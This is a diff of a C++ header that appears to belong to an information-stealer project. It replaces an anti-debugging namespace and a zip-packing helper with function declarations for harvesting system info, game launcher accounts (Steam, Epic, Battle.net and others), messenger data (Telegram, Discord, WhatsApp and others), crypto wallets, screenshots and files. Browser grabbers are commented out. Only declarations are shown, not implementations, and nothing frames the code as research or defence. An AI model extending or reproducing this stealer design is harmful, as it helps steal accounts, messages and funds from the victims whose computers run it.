@@ -22,20 +22,71 @@
 -----------------------------------------------------------------
 */
 
-// header for access to dir scripts
+// all targets 
 
-namespace antidebug {
+namespace cursystem
+{
 	/// <summary>
-	/// checks if reverse-debugging is doing on the program
+	/// get processes
 	/// </summary>
-	void AntiDebug();
+	void GetProcesses();
+
+	/// <summary>
+	/// get all installed progs in program files
+	/// </summary>
+	void GetProgs();
+
+	/// <summary>
+	/// get all needed info about system, hardware and software
+	/// </summary>
+	void GetSysInfo();
 }
 
-namespace manager {
-	/// <summary>
-	/// make needed dirs
-	/// </summary>
-	void MakeDirs();
+namespace gaming 
+{
+	void BattleNet();
 
-	int MakeZip();
+	void Epic();
+
+	void Minecraft();
+
+	void Steam();
+
+	void Ubisoft();
+}
+
+namespace messengers 
+{
+	void Telegram();
+
+	void Discord();
+
+	void Skype();
+
+	void Viber();
+
+	void Whatsapp();
+}
+
+namespace wallets
+{
+	void Wallets();
+}
+
+namespace images
+{
+	void Screenshot();
+}
+
+namespace files
+{
+	void Txt_files();
+	void File_Grabber();
+}
+
+namespace browsers 
+{
+	//void Chromium();
+
+	//void FireFox();
 }
